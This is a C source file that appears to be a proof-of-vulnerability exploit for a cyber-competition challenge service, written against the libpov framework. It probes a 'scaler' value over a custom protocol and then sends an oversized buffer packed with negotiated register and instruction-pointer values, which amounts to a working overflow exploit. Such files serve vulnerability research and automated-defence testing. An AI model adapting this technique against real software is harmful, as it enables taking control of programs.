/*

Author: Bryce Kerley <bryce@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libpov.h>
#include "protocol.h"
#include "messages.h"
#include "block.h"

#define SCALER_MIN 0.4
#define SCALER_MAX 0.6

#define BUF_LEN 80

uint8 probe_new_scaler(float64 scaler);
void send_payload(uint32 len, char* buf);

float64 probe_splatter = 6382.74623416;

int main(void)
{
	type1_vals t1vals;
 	type1_negotiate(0xffffffff, 0xffffffff, 5, &t1vals);

        protocol_with_recv_frame(^uint8 (protocol_frame* hello) {
            // consume hello
            return 0;
          });

        float64 scaler = SCALER_MIN;
        uint8 check_value = 0;
        uint8 max_check_value = 0;
        char max_check_out[80];
        
        float64 scaler_delta = 0.01;
        
        while (check_value < 60) {
          scaler += scaler_delta;
          check_value = probe_new_scaler(scaler);

          if (check_value > max_check_value) {
            max_check_value = check_value;
          }

          if (scaler >= SCALER_MAX) {
            scaler = SCALER_MAX;
            scaler_delta = (-scaler_delta) / 2;
          }
          else if (scaler <= SCALER_MIN) {
            scaler = SCALER_MIN;
            scaler_delta = (-scaler_delta) / 2;
          }
        }

        // found a plausible scaler
        uint8 intermediate = check_value + 50;
        uint8 buf_len = intermediate - (intermediate % 8);
        
        char buf[buf_len];
        uint32 increment = sizeof(void*);
        for (uint8 i = 0; i < buf_len; i+= 2 * increment) {
          *(unsigned int*)&(buf[i]) = t1vals.regval;
          *(unsigned int*)&(buf[i + increment]) = t1vals.ipval;
        }

        send_payload(buf_len, (char*)(buf));

        protocol_with_recv_frame(^uint8 (protocol_frame* hello) {
            // consume doubler response
            return 0;
          });
        
	return 0;
}

uint8 probe_new_scaler(float64 scaler) {
  probe_splatter += 1.0;
  protocol_frame check_req;
  check_req_contents check_req_val;
  check_req.id = CHECK_REQ_ID;
  check_req.length = CHECK_REQ_EXPECTED_LENGTH;
  check_req.value = (void*)&check_req_val;
  check_req_val.pos0 = probe_splatter;
  check_req_val.pos1 = scaler;
  
  protocol_send(&check_req);
  uint8 __block check_value;
  protocol_with_recv_frame(^uint8 (protocol_frame* check_resp) {
      check_value = ((check_resp_contents*) check_resp->value)->pos0;
      
      return 0;
    });

  return check_value;
}

void send_payload(uint32 len, char* buf) {
  protocol_frame double_req;
  double_req.id = DOUBLE_REQ_ID;
  double_req.length = len;
  double_req.value = (void*)buf;

  protocol_send(&double_req);
}



